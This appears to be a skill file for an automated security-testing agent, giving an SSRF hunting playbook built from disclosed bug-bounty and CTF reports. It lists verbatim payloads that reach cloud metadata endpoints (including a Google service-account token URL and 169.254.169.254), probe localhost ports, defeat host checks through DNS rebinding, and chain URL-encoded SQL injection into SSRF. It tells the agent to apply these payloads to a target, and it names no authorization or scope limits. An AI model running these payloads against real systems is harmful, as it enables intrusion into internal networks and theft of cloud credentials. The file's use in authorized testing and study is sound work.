---
name: hunter-l4-ssrf
description: "Detect and exploit SSRF to reach internal systems/cloud metadata, with real bypass techniques."
domain: cybersecurity
subdomain: web
tags:
- web
- ssrf
- hunting
- l4
version: '1.0'
---
# L4 Playbook: SSRF (hunter)

**L3 technique sheet:** `knowledge/sheets/ssrf.md` — (pending L3 synthesis)

## When to use
Attack a target surface for SSRF. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 809248 [ajaysenr]
- endpoint: `N/A (GitLab Runner docker client -> executor dockerd)`
- parameter: `N/A`
- payload: `http://metadata.google.internal:80/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text`
- root cause: GitLab Runner's docker client follows HTTP redirects from the executor's docker daemon (which, including its TLS certs, is fully attacker-controlled),
- impact: Achieved blind SSRF against Google Cloud metadata: the first character 'a' of the access_token appeared in CI logs (full token not recovered); can iss

### 1018568 [ajaysenr]
- endpoint: `ACP — Jabber settings (POST)`
- parameter: `jabber_server, jabber_port`
- payload: `jabber server = 127.0.0.1, jabber port = <target port>`
- root cause: The Jabber server/port fields accept arbitrary hosts and the app connects to them, printing socket and service version info to the admin screen.
- impact: Port-scanned localhost/internal services and enumerated software type/version (e.g., connected to an internal sshd on 127.0.0.1:2222 and read its bann

### 1028396 [ajaysenr]
- endpoint: `GET /conferences/get_recording_slides_xml.xml`
- parameter: `url`
- payload: `https://events.hackerone.com/conferences/get_recording_slides_xml.xml?url=myserver/xss.xml`
- root cause: The url parameter is fetched server-side without validation.
- impact: Server-Side Request Forgery possible via the url parameter - the server fetches attacker-controlled URLs (program-confirmed).

### 1055823 [ajaysenr]
- endpoint: `POST / (Add custom HTTP integration)`
- parameter: `endpoint (integration URL)`
- payload: `http://169.254.169.254/latest/meta-data/ami-id`
- root cause: The integration endpoint input is not validated and the server fetches it server-side, echoing the response body into the integration message.
- impact: Retrieved AWS EC2 instance metadata (ami-id) from 169.254.169.254 via the custom integration; gives access to the server internal network and private/

### 1057531 [ajaysenr]
- endpoint: `GET /api/v2/url_info`
- parameter: `url`
- payload: `http://127.0.0.1:9090`
- root cause: The url_info endpoint fetches the user-supplied url parameter with no SSRF restrictions.
- impact: Confirmed server-side requests to an external controller (observed source IP 74.114.154.11 in the AUTOMATTIC range) and to localhost (127.0.0.1:9090, 

### 1065517 [ajaysenr]
- endpoint: `GET /r3c0n_server_4fdk59/album -> /picture (internal API)`
- parameter: `hash, data`
- payload: `username=grinchadmin&password=s4nt4sucks`
- root cause: SQL injection (twice) is used to generate signed picture URLs, enabling SSRF to an internal API that is only reachable from inside the network.
- impact: Reached the internal API via SSRF, extracted credentials grinchadmin:s4nt4sucks, logged into the attack-box and retrieved flag{07a03135-9778-4dee-a83c

### 1065517 [ajaysenr]
- endpoint: `GET /attack-box/launch`
- parameter: `payload`
- payload: `MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1`
- root cause: The target check uses a TOCTOU host lookup that can be defeated by DNS rebinding, letting a signed request reach 127.0.0.1.
- impact: Bypassed the 127.0.0.1 block via DNS rebinding and made the server attack itself, revealing flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}.

### 1065583 [ajaysenr]
- endpoint: `GET /r3c0n_server_4fdk59/album -> /picture (internal API)`
- parameter: `hash, data`
- payload: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27%20UNION%20SELECT%20%22%27%20union%20select%201,2,%27../api/user%27%23%22,null,null%23`
- root cause: A SQL injection in the album hash is chained into a second-order SQLi that signs arbitrary picture URLs, enabling SSRF to the internal /api endpoint.
- impact: Via the internal API, brute-forced and extracted credentials username=grinchadmin password=s4nt4sucks, granting access to the attack-box login.

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

